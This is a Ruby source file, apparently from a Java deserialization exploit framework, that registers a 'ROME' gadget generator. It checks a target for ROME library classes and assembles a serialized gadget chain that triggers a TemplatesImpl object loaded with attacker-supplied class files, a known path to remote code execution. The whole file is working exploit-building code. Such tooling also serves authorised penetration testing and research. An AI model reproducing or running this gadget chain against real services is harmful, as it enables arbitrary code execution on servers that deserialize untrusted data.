# -*- coding: binary -*-
require_relative '../../payloads/rome'
require_relative '../../payloads/templates'

S=Rex::Java::Serialization 
class ROME < S::Generator::Gadget
  def id
    'rome'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('rome')

    unless ctx.flag?('rometools') ||
        ctx.class?('com.rometools.rome.feed.impl.ObjectBean') ||
        ctx.class?('com.sun.syndication.feed.impl.ObjectBean')
      return false
    end

    unless params.fetch('classfiles', nil).nil?
      return false unless S::Generator::Templates.supported(ctx,params)
    end

    true
  end

  def create(ctx, params: {})
    ctx.reg.load('model/rome.json')

    legacy = false
    tplcls = 'javax.xml.transform.Templates'
    if ctx.flag?('rometools') ||
       ctx.class?('com.rometools.rome.feed.impl.ObjectBean')
      legacy = false
    elsif ctx.class?('com.sun.syndication.feed.impl.ObjectBean')
      legacy = true
    else
      raise 'Incompatible'
    end

    if !params.fetch('classfiles', nil).nil?
      S::Payloads::ROME.make_properties_invoke(
        S::Generator::Templates.make(ctx,params), 
        tplcls, 
        legacy: legacy)
    else
      raise 'Missing parameters'
    end
  end
end

S::Generator.register(
  ROME.new
)
